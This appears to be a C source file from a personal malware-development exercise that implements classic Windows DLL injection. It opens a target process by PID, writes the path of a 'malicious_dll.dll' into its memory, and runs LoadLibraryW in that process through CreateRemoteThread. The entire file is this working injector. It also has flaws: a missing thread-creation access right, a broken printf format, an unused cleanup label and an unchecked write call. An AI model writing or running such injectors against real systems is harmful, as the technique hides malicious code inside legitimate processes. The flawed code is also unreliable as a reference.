#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <stdio.h>

// Define macros to create status symbols
#define DEFINE_STATUS_SYMBOL(name, value) \
    const char* name = value;

// Use the macros to define status symbols
DEFINE_STATUS_SYMBOL(SUCC, "[+]")
DEFINE_STATUS_SYMBOL(ERR, "[-]")
DEFINE_STATUS_SYMBOL(INFO, "[*]")

int main(int argc, char* argv[]) {
    /* Variable declaration */
    DWORD TID, PID = NULL;
    LPVOID rBuffer = NULL;
    HANDLE hProcess, hThread = NULL;
    HMODULE Kernel32Handel = NULL;
    wchar_t dllPath[MAX_PATH] = L"C:\\Users\\thoma\\Documents\\MalwareDev\\0x03 - DLL Injection\\malicious_dll.dll";
    size_t pathSize = sizeof(dllPath);
    size_t bytesWritten = 0;

    /* Ger Process Handle */
    if (argc < 2) {
        printf("Usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    /* Parse user input */
    PID = atoi(argv[1]);
    printf("%sAttempting to get process handle.\n", INFO);
    hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, PID);
    if (hProcess == NULL) {
        printf("%s Cannot get process handle.\n", ERR);
        return EXIT_FAILURE;
    }
    printf("%sSuccessfully got process handle.\n", SUCC);
    printf("\t-0x%p\n", hProcess);

    /* Get Handle to Kernel32 -> Use it's functions to load our exploit DLL */
    printf("%s Getting Kernel32.dll's handle.\n", INFO);
    Kernel32Handel = GetModuleHandleW(L"kernel32");
    if (Kernel32Handel == NULL) {
        printf("%s Error getting Kernel32's handle.\n", ERR);
        return EXIT_FAILURE;
    }
    printf("%s Got a handle to Kernel32.dll\n", SUCC);
    printf("\t-0x%p\n", Kernel32Handel);

    /* Now use kernel32's LoadLibrary() function to load our malicious DLL */
    printf("%s Findng address of LoadLibrary().\n", INFO);
    LPTHREAD_START_ROUTINE maliciousLoadDLL = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Handel, "LoadLibraryW");
    printf("%s Found address of LoadLibrary() from Kernel32\n", SUCC);
    printf("\t-0x%p\n", maliciousLoadDLL);

    /* Setup our exploit */
    rBuffer = VirtualAllocEx(
            hProcess, 
            NULL, 
            pathSize, 
            (MEM_COMMIT | MEM_RESERVE), 
            PAGE_READWRITE
            );
    if (NULL == rBuffer) {
        printf("%s VirtualAlloc Failed, error:", ERR, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s Allocated a buffer with PAGE_READWRITE permissions.\n\t-0x%p\n", SUCC, rBuffer);

    /* Write our malicious DLL into target process */
    WriteProcessMemory(
        hProcess,
        rBuffer,
        dllPath,
        pathSize,
        &bytesWritten
    );
    printf("%s Successfully wrote bytes into allocated buffer\n", SUCC);
    
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        maliciousLoadDLL,
        rBuffer,
        0,
        0
    );
    if (NULL == hThread) {
        printf("%s Error getting thread handle\n", ERR);
        return EXIT_FAILURE;
    }
    printf("%s Successfully got thread handle\n", SUCC);

    /* Wait for thread to finish executing */
    WaitForSingleObject(hThread, INFINITE);
    printf("%s Thread finished execution.\n", SUCC);

    CLEANUP:
        if (hThread) {
            printf("%s Closing Thread Handle\n", INFO);
            CloseHandle(hThread);
        }
        if (hProcess) {
            printf("%s Closing Process Handle\n", INFO);
            CloseHandle(hProcess);
        }
        return EXIT_SUCCESS;
}